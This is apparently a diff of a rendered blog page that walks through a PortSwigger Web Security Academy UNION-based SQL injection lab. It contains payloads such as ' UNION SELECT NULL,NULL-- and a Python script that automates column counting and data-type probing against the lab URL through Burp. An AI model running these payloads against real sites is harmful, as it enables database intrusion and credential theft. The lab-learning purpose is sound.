@@ -164,11 +164,11 @@
 </p>
 <h3 id="inferring-the-sql-query-being-run">Inferring The SQL Query Being Run:</h3>
 <p>Looking at the way the page we returns information can infer the query being run is similar to the below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;</span> <span style="color:#66d9ef">AND</span> [rest <span style="color:#66d9ef">of</span> query]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;</span> <span style="color:#66d9ef">AND</span> [rest <span style="color:#66d9ef">of</span> query]
 </span></span></code></pre></div><p>When we add our single quote it becomes the below which is syntactically incorrect.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;&#39; AND [rest of query]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;&#39; AND [rest of query]
 </span></span></span></code></pre></div><p>However when we add another quote it becomes the below, closing off the first quotation mark we provided.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;&#39;&#39;</span> <span style="color:#66d9ef">AND</span> [rest <span style="color:#66d9ef">of</span> query]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">FROM</span> products <span style="color:#66d9ef">WHERE</span> category <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pets&#39;&#39;&#39;</span> <span style="color:#66d9ef">AND</span> [rest <span style="color:#66d9ef">of</span> query]
 </span></span></code></pre></div><h3 id="union-select-requirements">UNION SELECT Requirements:</h3>
 <p>As the lab wants us to retrieve data using a <code>UNION SELECT</code> query we also need to ensure that the two requirements for this attack are met:</p>
 <ol>
@@ -191,7 +191,7 @@ This means that if the table is returning strings such as item names in column 1
 <h4 id="using-burp">Using Burp:</h4>
 <p>In order for us to display data we need to establish how many columns are in the existing database.</p>
 <p>If we return back to repeater we can enter the payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL--
 </span></span></span></code></pre></div><p><p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-11-13_06-52.png" alt=""  />
 </p>
@@ -202,7 +202,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </p>
 </p>
 <p>If we send this payload we get a <code>500</code> response meaning the number of columns is not correct, so add another <code>NULL</code> so our payload and repeat the process.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL--
 </span></span></span></code></pre></div><p>This time we get a <code>200</code> response so we know this particular table has 2 columns.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-11-13_06-54.png" alt=""  />
@@ -228,10 +228,10 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </p>
 </p>
 <p>Convert the certificate to the <code>.pem</code> format so the python requests module can use it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>openssl x509 -inform der -in certificate.cer -out certificate.pem
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>openssl x509 -inform der -in certificate.cer -out certificate.pem
 </span></span></code></pre></div><h5 id="imports">Imports:</h5>
 <p>First we import the modules we will need, <code>requests</code> &amp; <code>os</code>. We also suppress the <code>requests</code> warning that will show.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings(requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InsecureRequestWarning)
 </span></span></code></pre></div><p>If we didn&rsquo;t suppress the warnings the output would look like this.
@@ -241,7 +241,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </p>
 <h5 id="proxy-setup">Proxy Setup:</h5>
 <p>Now we declare our proxy so we can push all our traffic through burp, we also pass in the converted certificate.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>proxy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1:8080&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>proxy <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://127.0.0.1:8080&#39;</span>
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;HTTP_PROXY&#39;</span>] <span style="color:#f92672">=</span> proxy
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;HTTPS_PROXY&#39;</span>] <span style="color:#f92672">=</span> proxy
 </span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>environ[<span style="color:#e6db74">&#39;REQUESTS_CA_BUNDLE&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;certificate.pem&#34;</span>
@@ -251,7 +251,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 <p>Proxies &amp; URL:</p>
 <p>We declare an array of proxies to proxy our requests through as well as the unique url &amp; category endpoint.
 <del>Note</del>: The category and URL vary from instance to instance.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>proxies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>, <span style="color:#e6db74">&#34;https&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>}
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>proxies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>, <span style="color:#e6db74">&#34;https&#34;</span>: <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>}
 </span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://0aa9007a0350e042804fee0b002f0021.web-security-academy.net/filter?category=Gifts&#34;</span>
 </span></span></code></pre></div></li>
 </ul>
@@ -259,7 +259,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 <li>
 <p>SQL Syntax &amp; Counters:</p>
 <p>So now we have our payload broken up into various elements, the reason for this is because we don&rsquo;t want to just supply a list of multiple <code>UNION SELECT</code> statements, doing it this way offers more flexibility as well as ensuring we don&rsquo;t repeat ourselves, it also means we could check databases with thousands of columns and it would still work.(I wouldn&rsquo;t advise that but you could)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>union<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39; UNION SELECT &#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>union<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#39; UNION SELECT &#34;</span>
 </span></span><span style="display:flex;"><span>comma<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;,&#34;</span>
 </span></span><span style="display:flex;"><span>nullPayload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;NULL&#34;</span>
 </span></span><span style="display:flex;"><span>comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;--&#34;</span>
@@ -267,7 +267,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span>union<span style="color:#f92672">+</span>nullPayload
 </span></span><span style="display:flex;"><span>counter<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>
 </span></span></code></pre></div><p>We also create a <code>counter</code> variable and set it to <code>2</code>. This <code>counter</code> is used to track how many <code>NULL</code> values (columns) are in our <code>UNION SELECT</code> payload as we build it. Our starting payload is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> union <span style="color:#f92672">+</span> nullPayload <span style="color:#75715e"># &#34;&#39; UNION SELECT NULL&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> union <span style="color:#f92672">+</span> nullPayload <span style="color:#75715e"># &#34;&#39; UNION SELECT NULL&#34;</span>
 </span></span></code></pre></div><p>So before the loop runs we already have one <code>NULL</code> in the query. Inside the loop, we keep appending more <code>,NULL</code> values to <code>payload</code> and update <code>counter</code> to reflect the number of columns.</p>
 <p>We don’t start the <code>counter</code> at <code>0</code> because SQL columns are conceptually counted from 1 (first column, second column etc…) and our payload already includes the first <code>NULL</code> column. If we started from 0, the value of <code>counter</code> would always lag behind the actual number of <code>NULL</code> columns in the query. By starting at <code>2</code>, the value of <code>counter</code> stays aligned with the true column count once we begin adding additional <code>NULL</code> values in the loop.</p>
 </li>
@@ -282,7 +282,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </ul>
 <p>If these above conditions are met it will <code>break</code> out of the loop and stop the process.</p>
 <p>If the above is not found it will add an additional <code>NULL</code> value using the <code>additionalNull</code> variable to the payload &amp; increment the <code>counter</code> by <code>1</code> and continue.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">10</span>):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
 </span></span><span style="display:flex;"><span>        request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> comment, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;My account&#39;</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>text:
@@ -295,7 +295,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </span></span><span style="display:flex;"><span>        counter<span style="color:#f92672">+=</span>i
 </span></span></code></pre></div><h5 id="error-handling">Error Handling:</h5>
 <p>These <code>except</code> clauses are used for error handling to ensure if an error is encountered they are logged to the terminal and the process continues.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>HTTPError <span style="color:#66d9ef">as</span> errh:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>HTTPError <span style="color:#66d9ef">as</span> errh:
 </span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;Http Error:&#34;</span>,errh)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>ConnectionError <span style="color:#66d9ef">as</span> errc:
 </span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;Error Connecting:&#34;</span>,errc)
@@ -304,7 +304,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> err:
 </span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;OOps: Something Else&#34;</span>,err)
 </span></span></code></pre></div><h5 id="full-script">Full Script:</h5>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
 </span></span><span style="display:flex;"><span>requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>disable_warnings(requests<span style="color:#f92672">.</span>packages<span style="color:#f92672">.</span>urllib3<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>InsecureRequestWarning)
@@ -346,7 +346,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </span></span><span style="display:flex;"><span>        print (<span style="color:#e6db74">&#34;OOps: Something Else&#34;</span>,err)
 </span></span></code></pre></div><h5 id="running-the-script">Running The Script:</h5>
 <p>As we can see it tells what we expect, there are 2 columns and the correction payload is:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; UNION SELECT NULL,NULL--
 </span></span></span></code></pre></div><figure><img src="/ox-hugo/2025-11-13_07-05.png">
 </figure>
 
@@ -354,7 +354,7 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 <h4 id="using-burp">Using Burp:</h4>
 <p>Much like how we established the number of columns we can use repeater to determine the column data type.</p>
 <p>We know to pass the lab we need to extract the administrators username &amp; password, then login. Typically usernames and passwords would be a string data type in the database. So to enumerate this we will systematically start replacing the <code>NULL</code> values of our payload with the string values <code>'a'</code>. This means our payload becomes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+&#39;</span>a<span style="color:#e6db74">&#39;,NULL--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+&#39;</span>a<span style="color:#e6db74">&#39;,NULL--
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">UNION</span><span style="color:#f92672">+</span><span style="color:#66d9ef">SELECT</span><span style="color:#f92672">+</span><span style="color:#66d9ef">NULL</span>,<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#75715e">--
 </span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+&#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>a<span style="color:#e6db74">&#39;--
 </span></span></span></code></pre></div><p><del>Note</del>: We know we are looking to extract two string values and the table has two columns so it&rsquo;s pretty easy to infer the solution is the last payload above, however let&rsquo;s go through the motions for comprehensiveness.</p>
@@ -364,17 +364,17 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </p>
 </p>
 <p>We now modify our payload so the string value is in the second <code>NULL</code> position and revert the first position to be <code>NULL</code> again.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+NULL,&#39;</span>a<span style="color:#e6db74">&#39;--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+NULL,&#39;</span>a<span style="color:#e6db74">&#39;--
 </span></span></span></code></pre></div><p>We can see this worked again.
 <p class="imgp">
   <img loading="lazy" src="/ox-hugo/2025-11-13_07-13.png" alt=""  />
 </p>
 </p>
 <p>This means that both columns are compatible with string datatypes (as to be expected) so the final payload below is also valid</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+&#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>a<span style="color:#e6db74">&#39;--
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;+UNION+SELECT+&#39;</span>a<span style="color:#e6db74">&#39;,&#39;</span>a<span style="color:#e6db74">&#39;--
 </span></span></span></code></pre></div><h4 id="using-python">Using Python:</h4>
 <p>We can also do this in python by adding to our initial script. I have placed this in a diff block so you can see what we have added.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#a6e22e">+compatible=0
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#a6e22e">+compatible=0
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>for i in range(10):
 </span></span><span style="display:flex;"><span>    try:
@@ -401,30 +401,30 @@ We then select the payload &amp; press <code>CTRL+U</code> to URL encode it.
 </span></span><span style="display:flex;"><span>        counter+=i
 </span></span></code></pre></div><p><strong>Compatible Variable</strong>:
 This is going to be used later on to print out a specific message if we find more than 1 compatible data type column so at the moment we set this with a value of <code>0</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compatible<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compatible<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
 </span></span></code></pre></div><p><strong>List Creation</strong>:
 We then create a <code>payloadList</code> that&rsquo;s contents is the value of <code>nullPayload</code> (which is &ldquo;NULL&rdquo;) and this is equal to the value of the counter so if the counter is 2 then the list value is <code>['NULL', 'NULL']</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payloadList<span style="color:#f92672">=</span>[nullPayload] <span style="color:#f92672">*</span> counter
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>payloadList<span style="color:#f92672">=</span>[nullPayload] <span style="color:#f92672">*</span> counter
 </span></span></code></pre></div><p><strong>List Iteration</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> payloadList[y] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;NULL&#34;</span>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> payloadList[y] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;NULL&#34;</span>:
 </span></span><span style="display:flex;"><span>   payloadList[y] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#39;string&#39;&#34;</span>
 </span></span></code></pre></div><p>We now iterate through the length of the list and if the value of <code>y</code> in the list is equal to <code>NULL</code> (which it will be) we replace that with the with a string called string. So on the first run it would <code>['string', NULL]</code>.</p>
 <p><strong>New Payload Creation</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>newPayload<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">.</span>join(payloadList))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>newPayload<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#34;,&#34;</span><span style="color:#f92672">.</span>join(payloadList))
 </span></span></code></pre></div><p>We then join our list together into a string so we can pass this to our request later, and we ensure we separate  with a comma <code>,</code> other wise our payload would be <code>&quot;'string'NULLNULL&quot;</code></p>
 <p><strong>Send our Request</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> union <span style="color:#f92672">+</span> newPayload <span style="color:#f92672">+</span> comment, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> union <span style="color:#f92672">+</span> newPayload <span style="color:#f92672">+</span> comment, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;My account&#39;</span> <span style="color:#f92672">in</span> request<span style="color:#f92672">.</span>text:
 </span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Compatible data type found </span><span style="color:#e6db74">{</span>union<span style="color:#f92672">+</span>newPayload<span style="color:#f92672">+</span>comment<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
 </span></span></code></pre></div><p>Next we send our request like before but this time we are using our new payload. We also need to ensure we send the <code>&quot;union&quot;</code> variable as this is not currently present in our list/string/payloadstring.</p>
 <p>We also perform the same type of check in the body of the request for the string &ldquo;My account&rdquo; which will signify that we have had a <code>200</code> OK response, and in this event it will print out the payload.</p>
 <p><strong>Compatible Logic Counter</strong>:
 If the above conditions are met we increment our compatible counter by <code>1</code>. We then perform a check if the counter is greater than <code>1</code> and if it is we print out the total number of compatible data types found and suggest the user combine the payloads.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compatible<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>compatible<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
